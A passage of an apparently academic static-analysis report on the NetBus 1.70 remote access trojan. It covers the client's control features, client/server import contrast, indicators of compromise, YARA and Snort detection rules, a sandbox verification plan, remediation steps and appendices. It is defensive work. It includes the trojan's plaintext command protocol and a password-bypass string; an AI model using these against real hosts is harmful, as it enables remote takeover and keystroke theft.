| Compile timestamp | 1992-06-19 22:22:17 UTC (same fixed stub value) |
| Overall entropy | 6.519 — not packed |
| Version resource | None |

## 6.2 Identification

The main form caption reads:

```
Caption = 'NetBus 1.70, by cf'
```

`cf` = **Carl-Fredrik Neikter**, matching the authorship stated in `NetBus.rtf` (©1998).

## 6.3 Control surface

Reconstructed from the client's compiled forms. Each control maps to a capability exercised
against an infected host:

| Control caption | Capability |
|---|---|
| `Connect!` | Establish session with a server |
| `Get info` | Host reconnaissance |
| `File manager` | Browse / upload / download / delete files |
| `Listen` | Receive captured keystrokes |
| `Key manager` | Send synthetic keystrokes; disable keys |
| `Screendump` | Retrieve screen capture |
| `Active wnds` | Enumerate open windows |
| `Start program` | Execute arbitrary programs |
| `Msg manager` | Display dialogs on the victim's desktop |
| `Send text` | Inject text into the focused application |
| `Control mouse` / `Mouse pos` | Drive the victim's cursor |
| `Swap mouse` | Swap mouse buttons |
| `Open CD-ROM` | Eject the CD tray |
| `Play sound` / `Sound system` | Audio playback and volume control |
| `Show image` | Display an image on the victim's screen |
| `Go to URL` | Force browser navigation |
| `Exit Windows` | Remote shutdown / logoff / reboot |
| `Server admin` | Remote server configuration |
| `About` | Version information |

Additional forms present as separate resources:

| Form | Function |
|---|---|
| `TFILEMGRFORM` | File manager |
| `TLISTENFORM` | Keystroke listener |
| `TKEYFORM` | Key manipulation |
| `TSCANFORM` | **Port scanner** — locate other infected hosts |
| `TPORTREDIRFORM` | TCP port redirection (pivoting) |
| `TAPPREDIRFORM` | Application I/O redirection |
| `TSVRSETUPFORM` | Remote server configuration |
| `TADMINFORM` | Administration / access control |
| `TSHUTFORM` | Shutdown control |
| `TIMAGEFORM`, `TREALFORM` | Screen-capture display |
| `TPASSWORDDLG` | Password prompt |
| `TMEMOFORM` | Notes (backs `Memo.txt`) |

The client's main form also declares client sockets on **12345, 12346 and 12347**, mirroring the
server exactly and independently corroborating the three-channel architecture.

## 6.4 Interpretation

`NetBus.exe` is not itself a backdoor: it neither persists, nor listens, nor executes code
locally. It is an **attack tool** whose sole purpose is to control hosts infected with
`patch.exe`. Its presence on a system indicates that machine was used to *operate* the RAT
rather than being a victim of it — a distinction that matters materially in an investigation.

---

# 7. Comparative analysis: client vs server

The cleanest empirical proof of the two roles is the import asymmetry:

| Capability | `patch.exe` (server) | `NetBus.exe` (client) | Interpretation |
|---|---|---|---|
| **Socket role** | `bind`, `listen`, `accept` | `connect` only | Server listens; client dials out |
| **Process creation** | `CreateProcessA` | — absent — | Only the server executes code |
| **Process termination** | `TerminateProcess`, `OpenProcess` | — absent — | Only the server kills processes |
| **Input injection** | `keybd_event`, `mouse_event`, `SetCursorPos` | — absent — | Only the server injects input |
| **System shutdown** | `ExitWindowsEx` | — absent — | Only the server can shut down |
| **File deletion** | `DeleteFileA`, `CopyFileA` | — absent — | Only the server modifies the filesystem |
| **Persistence** | `RegSetValueExA` + `RegDeleteValueA` | `RegSetValueExA` only | Server installs/uninstalls; client stores its own settings |
| **Process hiding** | `RegisterServiceProcess` | — absent — | Only the server hides |
| **Multimedia** | 15 `winmm` imports | 2 `winmm` imports | Server performs actions; client merely requests them |
| **Screen capture** | Full GDI chain | Partial (display only) | Server captures; client renders |

Every destructive or invasive primitive resides exclusively in `patch.exe`. This asymmetry is
strong enough to classify the two binaries **without executing either** and without relying on
the bundled documentation.

---

# 8. Indicators of compromise

## 8.1 Network indicators

| Indicator | Detail |
|---|---|
| TCP **12345** | Command channel (non-blocking) |
| TCP **12346** | Bulk data channel |
| TCP **12347** | Screen-capture channel (**undocumented**) |
| TCP dynamic | Port- and application-redirection channels |
| TCP **25** outbound | SMTP with subject `NetBus server is up and running`, repeating at 60 s |
| Plaintext protocol | ASCII `command;arg;arg` — e.g. `Password;`, `GetInfo`, `GetApps`, `DownloadFile`, `ClickOnKey` |
| JPEG in stream | `FF D8 FF` magic within a TCP stream on 12347 |
| Unexpected relaying | Host acting as a TCP relay for third-party traffic |

## 8.2 Host indicators

| Indicator | Location |
|---|---|
| Autorun value | `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` |
| Settings key | `HKCU\Patch\Settings` |
| Password value | `HKCU\Patch\Settings\ServerPwd` (**cleartext**) |
| Keyboard-layout key | `System\CurrentControlSet\Control\Keyboard Layouts\%.8x` |
| **Mutex** | **`NBMutex`** — highest-confidence live-infection indicator |
| Files | `patch.exe`, `KeyHook.dll` in `%WINDIR%` / `%SYSTEM%` |
| Access control file | `Access.txt` (operator IP allow-list) |
| Hidden process | Process absent from the task list via `RegisterServiceProcess` |
| Client artefacts | `NetBus.exe`, `Hosts.txt`, `Memo.txt` → indicates **operator**, not victim |

## 8.3 File hashes

```
patch.exe    73a62d6593e3c70b60455299b793bb18d31eddd5f15d04442932c1d3ccb7eb0c
NetBus.exe   848e12d94d467f2add01403a730e0b4762f594baf70c425fe86b3917c3f0b00b
```

## 8.4 Static string indicators

```
NetBus 1.70
NetBus server is running on
Clients connected to this host:
Subject: NetBus server is up and running
NBMutex
KeyHook.dll
ServerPwd
Process is already active
```

---

# 9. Detection engineering

## 9.1 YARA — file-based

Built on recovered behavioural artefacts rather than a file hash, so recompiled or repacked
variants remain detectable.

```yara
rule NetBus_170_Server
{
    meta:
        description = "NetBus 1.70 server (patch.exe) - RAT backdoor"
        reference   = "CAN-1999-0660"
        author      = "Kenil"
        date        = "2026-07-23"
        severity    = "critical"

    strings:
        $banner  = "NetBus 1.70"                                    ascii
        $running = "NetBus server is running on"                    ascii
        $mutex   = "NBMutex"                                        ascii
        $hook    = "KeyHook.dll"                                    ascii
        $pwd     = "ServerPwd"                                      ascii
        $mail    = "Subject: NetBus server is up and running"       ascii
        $run     = "\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" ascii
        $hide    = "RegisterServiceProcess"                         ascii
        $access  = "Access.txt"                                     ascii

    condition:
        uint16(0) == 0x5A4D and filesize < 2MB and 4 of them
}

rule NetBus_170_Client
{
    meta:
        description = "NetBus 1.70 client (attacker console)"
        author      = "Kenil"

    strings:
        $cap   = "NetBus 1.70, by cf"   ascii
        $f1    = "TFILEMGRFORM"         ascii
        $f2    = "TSCANFORM"            ascii
        $f3    = "TPORTREDIRFORM"       ascii
        $f4    = "TSVRSETUPFORM"        ascii

    condition:
        uint16(0) == 0x5A4D and ($cap or 3 of ($f*))
}

rule NetBus_Delphi_Form_Ports
{
    meta:
        description = "NetBus socket ports in compiled Delphi DFM data"
        note        = "Detects the int16 port properties, not ASCII strings"

    strings:
        // 'Port' + vaInt16 (0x03) + little-endian port value
        $p12345 = { 50 6F 72 74 03 39 30 }
        $p12346 = { 50 6F 72 74 03 3A 30 }
        $p12347 = { 50 6F 72 74 03 3B 30 }

    condition:
        uint16(0) == 0x5A4D and 2 of them
}
```

## 9.2 Snort / Suricata — network-based

Because the protocol is unencrypted, network detection is highly reliable.

```
alert tcp any any -> $HOME_NET 12345 (
    msg:"NetBus 1.70 command channel - connection attempt";
    flow:to_server,established;
    content:"Password"; depth:16;
    classtype:trojan-activity; sid:9000001; rev:1;)

alert tcp $HOME_NET 12345 -> any any (
    msg:"NetBus 1.70 server banner observed";
    flow:from_server,established;
    content:"NetBus"; depth:16;
    classtype:trojan-activity; sid:9000002; rev:1;)

alert tcp any any -> $HOME_NET [12345,12346,12347] (
    msg:"NetBus 1.70 - connection to RAT port range";
    flow:to_server;
    classtype:trojan-activity; sid:9000003; rev:1;)

alert tcp $HOME_NET any -> any 25 (
    msg:"NetBus 1.70 infection notification via SMTP";
    flow:to_server,established;
    content:"NetBus server is up and running";
    classtype:trojan-activity; sid:9000004; rev:1;)
```

## 9.3 Host-based hunting

| Method | Query / check |
|---|---|
| Mutex enumeration | Look for `NBMutex` in the object namespace — definitive for a running instance |
| Registry audit | Enumerate `HKLM\...\CurrentVersion\Run`; check for `HKCU\Patch\Settings` |
| Port audit | `netstat -ano` for listeners on 12345 / 12346 / 12347 |
| File audit | `patch.exe`, `KeyHook.dll`, `Access.txt` in `%WINDIR%` / `%SYSTEM%` |
| Module audit | Processes with `KeyHook.dll` loaded (hook injection) |

---

# 10. Behavioural analysis plan

Static analysis has produced a complete capability model. Dynamic analysis should now be used to
**verify** it, not to discover it.

## 10.1 Laboratory requirements

| Requirement | Specification |
|---|---|
| Guest OS | Windows 98 or Windows 2000 — matches the target era |
| Networking | Host-only, with INetSim or FakeNet-NG; **no route to the internet** |
| Isolation | No shared folders, no shared clipboard, no USB passthrough |
| Recovery | Clean snapshot taken before every run |

> `RegisterServiceProcess` exists only on Win9x. On a modern OS the process-hiding behaviour
> will silently fail, producing a misleadingly incomplete result. Guest-OS choice is a
> methodological decision, not a convenience.

## 10.2 Instrumentation

| Tool | Purpose |
|---|---|
| Procmon | File, registry and process activity |
| Process Explorer | Process tree, loaded modules, **handle/mutex enumeration** |
| Regshot | Before/after registry differential |
| Autoruns | Persistence differential |
| Wireshark | Packet capture |
| INetSim / FakeNet-NG | Simulated internet, including an SMTP responder |
| TCPView | Live listening-port monitoring |

## 10.3 Procedure

1. Snapshot the clean guest; capture Regshot and Autoruns baselines.
2. Start all instrumentation. Confirm the SMTP responder is listening.
3. Execute `patch.exe`. Record the process tree.
4. **Verify persistence** — expect a new value under `HKLM\...\CurrentVersion\Run`.
5. **Verify self-installation** — expect a copy of the binary in `%WINDIR%` (predicted from
   `GetWindowsDirectoryA` → `CopyFileA` at `0x4557AB` / `0x00455C9E`).
6. **Verify the mutex** — expect `NBMutex` in Process Explorer's handle view.
7. **Verify the listeners** — expect TCP 12345, 12346 **and 12347**. Confirming 12347 validates
   the form-reconstruction finding, which is the report's principal novel claim.
8. **Verify the keylogger** — expect `KeyHook.dll` written to disk and loaded as a module.
9. **Verify SMTP notification** — expect a connection to TCP 25 carrying
   `Subject: NetBus server is up and running`, repeating at 60-second intervals.
10. **Verify uninstallation** — run with `/remove` and re-diff; this validates §11.
11. Diff registry and autoruns; export all artefacts.
12. Optionally submit to CAPE or Cuckoo for an independent family verdict.

## 10.4 Falsifiable predictions

Stating predictions in advance makes the dynamic phase a genuine test rather than a
confirmation exercise:

| # | Prediction | Derived from |
|---|---|---|
| 1 | Three listeners appear: 12345, 12346, 12347 | DFM form reconstruction (§5.5) |
| 2 | A `Run` value is created | §5.7 |
| 3 | The binary copies itself to `%WINDIR%` | §5.8 |
| 4 | Mutex `NBMutex` is created | §5.9 |
| 5 | `KeyHook.dll` is written and loaded | §5.10 |
| 6 | Outbound SMTP fires, repeating every 60 s | §5.12 |
| 7 | Screen data on 12347 carries JPEG magic `FF D8 FF` | §5.11 |
| 8 | Process hiding **fails** on NT-family Windows | §5.9 |

---

# 11. Remediation

## 11.1 Immediate containment

1. **Isolate the host** from the network before any interactive work.
2. **Capture volatile memory** if the infection is live — the cleartext password and any
   active session data reside in memory.
3. **Block TCP 12345–12347** inbound and outbound at the perimeter.
4. **Alert on outbound SMTP** from hosts that have no business sending mail.

## 11.2 Eradication

1. Terminate the hidden process (identify via the `NBMutex` handle if it is absent from the
   task list).
2. Remove the autorun value from `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`.
3. Delete `patch.exe`, `KeyHook.dll` and `Access.txt` from `%WINDIR%` / `%SYSTEM%`.
4. Delete the `HKCU\Patch\Settings` key, including `ServerPwd`.
5. Verify no listeners remain on 12345–12347.

## 11.3 Recovery

| Action | Rationale |
|---|---|
| **Treat every credential entered on the host as compromised** | The keyboard hook plus `Login ID:` handling means passwords may have been captured. Rotate from a **clean** machine. |
| **Assume secondary payloads** | `CreateProcessA` permits arbitrary execution; anything could have been installed subsequently. |
| **Rebuild the host** | Given arbitrary code execution and a known authentication bypass, reimaging is the only fully reliable remediation. |
| **Review data exposure** | The `TFileIterator` rooted at `C:` means the entire system drive was enumerable, and file download was available. |
| **Consider third-party access** | The `Password;1;<any>` bypass means controllers *other than* the original operator may have had access. |

---

# 12. Analytical narrative — how the conclusion changed

This section is included deliberately. The reasoning path is as instructive as the result, and
documenting a corrected hypothesis is a professional obligation.

### Stage 1 — Initial triage (incorrect)

The first sample set contained `GRAFFITI.exe` alongside `NetBus.rtf`, `Hosts.txt` and
`Memo.txt`. Triage assessed `GRAFFITI.exe` as *"likely NetBus dropper — strongly indicated"*,
on three grounds:

- a NetBus manual bundled in the same folder;
- dropper-like imports (`ShellExecuteExA`, registry writes, temp-path resolution);
- an apparent `12345` string — NetBus's signature port.

Each is circumstantial. Together they produced a plausible but unverified narrative.

### Stage 2 — Advanced analysis (reversal)

Deeper examination overturned it:

- The `grafPrf` container's manifest arithmetic accounted for **every byte** of `card.lng`,
  ending exactly at EOF. No space existed for a hidden payload.
- All three embedded files were identified as clean Macromedia Director components, with
  American Greetings attribution from the binary's own build path.
- The `12345` "hit" was a **false positive** — `123456789` and a UTF-16 digit-glyph list.
- The stub imports no networking APIs, so it could not download a payload either.

### Stage 3 — Confirmation

The actual `patch.exe` and `NetBus.exe` were subsequently supplied as separate files, which
independently confirmed the revised reading: the collection is a **toolkit**, and the greeting
card was never the delivery vehicle.

### Lessons

| Lesson | Detail |
|---|---|
| **Proximity is not evidence** | A malware manual beside a file says nothing about that file's contents. |
| **Verify every string hit in context** | `12345` inside `123456789` is not a port. Grep produces candidates, not conclusions. |
| **Account for all bytes** | The arithmetic proof — manifest sums to exact file size — was more conclusive than any signature scan. |
| **Absence of capability is evidence** | No networking imports meant no download capability, regardless of what else was suspected. |
| **Match technique to toolchain** | Identifying Delphi is what led to DFM parsing, which produced every significant novel finding. |
| **Documentation is a hypothesis** | The manual omitted a port and an entire exfiltration channel. |

---

# 13. Limitations

1. **No dynamic execution.** All runtime behaviour is inferred from imports, resources, strings
   and disassembly. §10 defines the verification procedure and states falsifiable predictions.
2. **Partial disassembly.** Call sites for security-relevant APIs were located and annotated,
   but the command dispatcher was not reconstructed to full control-flow level. The protocol map
   derives from token extraction and form data.
3. **Delphi VCL noise.** `RT_STRING` tables are dominated by framework boilerplate. Malware-specific
   strings were separated by cross-referencing against known VCL message sets; a small residual
   risk of misattribution remains.
4. **`GRAFFITI.exe` Lingo not decompiled.** The Director movie's compiled Lingo bytecode was not
   decompiled (this requires a Director-specific tool such as ProjectorRays). Compiled Lingo
   nonetheless stores string literals in plaintext, and no suspicious literal exists — combined
   with the absence of any payload to launch, residual risk is negligible.
5. **No sandbox corroboration.** No third-party sandbox or multi-engine scan was used; verdicts
   rest entirely on first-principles analysis.
6. **Era-specific behaviour.** Several mechanisms (notably `RegisterServiceProcess`) are Win9x-only
   and cannot be validated on modern systems.

---

# 14. Appendices

## Appendix A — Import summary

### `patch.exe`

| DLL | Imports |
|---|---:|
| `kernel32.dll` | 36 + 5 + 85 |
| `user32.dll` | 3 + 146 |
| `advapi32.dll` | 3 + 11 |
| `gdi32.dll` | 65 |
| `comctl32.dll` | 24 |
| `oleaut32.dll` | 7 |
| `winmm.dll` | 15 |
| `wsock32.dll` | **25** |
| `comdlg32.dll` | 2 |
| `shell32.dll` | 1 |

### `NetBus.exe`

| DLL | Imports |
|---|---:|
| `kernel32.dll` | 36 + 5 + 62 |
| `user32.dll` | 3 + 141 |
| `advapi32.dll` | 3 + 7 |
| `gdi32.dll` | 68 |
| `comctl32.dll` | 24 |
| `oleaut32.dll` | 7 |
| `winmm.dll` | 2 |
| `wsock32.dll` | **17** |
| `comdlg32.dll` | 2 |
| `shell32.dll` | 2 |

## Appendix B — Annotated call-site map (`patch.exe`)

Resolved by locating `FF 25` import thunks and the `E8 rel32` calls targeting them.
428 import thunks were resolved in total.

| Virtual address | API | Function |
|---|---|---|
| `0x0042C5B0` | `SetWindowsHookExA` | Install keyboard hook |
| `0x0043A7B7` | `WSAStartup` | Initialise Winsock |
| `0x0043AF7F` | `bind` | Bind listening socket |
| `0x0043AFB9` | `listen` | Begin listening |
| `0x0043BD8C` | `accept` | Accept inbound connection |
| `0x0043E652` | `CreateMutexA` | Create `NBMutex` |
| `0x0043F1E6` | `CreateProcessA` | Execute program (site 1) |
| `0x0043F82B` | `RegCreateKeyExA` | Open/create `Run` key |
| `0x0043F8B2` | `RegDeleteValueA` | Remove persistence (`/remove`) |
| `0x0043F9DA` | `RegSetValueExA` | **Write autorun value** |
| `0x0043FFFB` | `GetWindowsDirectoryA` | Resolve `%WINDIR%` (site 1) |
| `0x00454525` | `CreateProcessA` | Execute program (site 2) |
| `0x004557AB` | `GetWindowsDirectoryA` | Resolve `%WINDIR%` (site 2) |
| `0x00455C9E` | `CopyFileA` | **Self-copy into `%WINDIR%`** |
| `0x00456C10` | `ShellExecuteA` | Shell execution |

Import thunk addresses:

```
0x00405544  RegCreateKeyExA        0x0040554C  RegDeleteValueA
0x0040556C  RegSetValueExA         0x00405584  CopyFileA
0x004055A4  CreateMutexA           0x004055B4  CreateProcessA
0x004056FC  GetWindowsDirectoryA   0x00405E1C  SetWindowsHookExA
0x004394E8  accept                 0x004394F0  bind
0x00439540  listen                 0x00439598  WSAStartup
0x0043FF88  ShellExecuteA
```

## Appendix C — Full decoded server form

See §5.5 for the complete `TMAINFORM2` reconstruction, produced with a purpose-written binary
DFM decoder implementing Delphi's `TValueType` encoding (`vaInt8=2`, `vaInt16=3`, `vaInt32=4`,
`vaString=6`, `vaIdent=7`, `vaFalse=8`, `vaTrue=9`, `vaSet=11`, `vaLString=12`, …) and
`TReader.ReadPrefix` semantics (a flags byte is present only when its high nibble is `0xF`).

## Appendix D — Malware-specific strings (VCL boilerplate excluded)

```
NetBus 1.70
NetBus server is running on
NetBus Char
NetBus Screen
Clients connected to this host:
Subject: NetBus server is up and running
mail from:
rcpt to:
MailTo / MailFrom / MailHost
NBMutex
Process is already active
KeyHook.dll / SetKeyHook / ClearKeyHook / MyKeyHook
ServerPwd
RemoveServer / PatchDone
Access.txt / Access;
Login ID:
LogTraffic
\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
System\CurrentControlSet\Control\Keyboard Layouts\%.8x
RegisterServiceProcess
/noadd  /pass:  /port:  /remove
JPEG error #%d
Cannot change the size of a JPEG image
```

## Appendix E — Reproduction

```bash
pip install pefile capstone --break-system-packages

# 1 — identification
file <sample>; md5sum <sample>; sha1sum <sample>; sha256sum <sample>

# 2 — PE structure, sections, entropy
python3 -c "import pefile,math;from collections import Counter; \
pe=pefile.PE('patch.exe'); \
ent=lambda d:(lambda c,n:-sum((v/n)*math.log2(v/n) for v in c.values()))(Counter(d),len(d)); \
[print(s.Name.rstrip(b'\0').decode(), round(ent(s.get_data()),3)) for s in pe.sections]"

# 3 — imports by capability
python3 analyse_imports.py patch.exe

# 4 — Delphi form reconstruction  ← the decisive step
python3 dfm.py patch.exe TMAINFORM2

# 5 — import thunks and call sites
python3 callsites.py patch.exe

# 6 — strings (verify every hit in context)
strings -n 4 patch.exe | grep -iE 'netbus|mutex|mail|run|keyhook'
```

> Note: `strings -n 4 patch.exe | grep 12345` returns **only** Delphi's `0123456789ABCDEF`
> conversion table. The ports are `int16` properties inside DFM resources and are recoverable
> only via step 4. This is the report's central methodological point.

## Appendix F — References

| Source | Use |
|---|---|
| `NetBus.rtf` — NetBus v1.70 manual, C-F. Neikter, 1998 | Author documentation (verified against binary; found incomplete) |
| CVE / CAN-1999-0660 | Vulnerability identifier for the NetBus family |
| Borland Delphi VCL — `TReader` / `TWriter` DFM format | Basis for the custom form decoder |
| Microsoft PE/COFF Specification | PE structure parsing |
| Microsoft Win32 API documentation | API behaviour classification |

---

**End of report.**

*Prepared for M.Sc. Cyber Security coursework. Contains live malware indicators — handle in
accordance with §Handling notice.*
